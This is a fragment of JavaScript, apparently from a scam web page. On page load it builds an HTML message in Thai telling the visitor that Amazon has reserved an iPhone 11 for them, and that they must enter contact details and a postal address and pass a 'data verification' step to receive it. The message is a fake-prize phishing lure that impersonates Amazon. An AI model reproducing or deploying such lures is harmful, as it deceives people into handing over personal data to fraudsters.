...
(function () {
  ...
  function onDOMContentLoaded() {
    ...
    var takeitessage = '<div>ของคุณ <span class="marked">ไอโฟน 11</span> ได้รับการสงวนไว้โดย Amazon!</div><br><br>1. ในหน้าถัดไปให้กรอกรายละเอียดการติดต่อและที่อยู่ทางไปรษณีย์ของคุณ<br>2. ผ่านการตรวจจับข้อมูล.<br>3. iPhone 11 ของคุณจะถูกจัดส่งภายใน 10-14 วันทำการ.</div>';
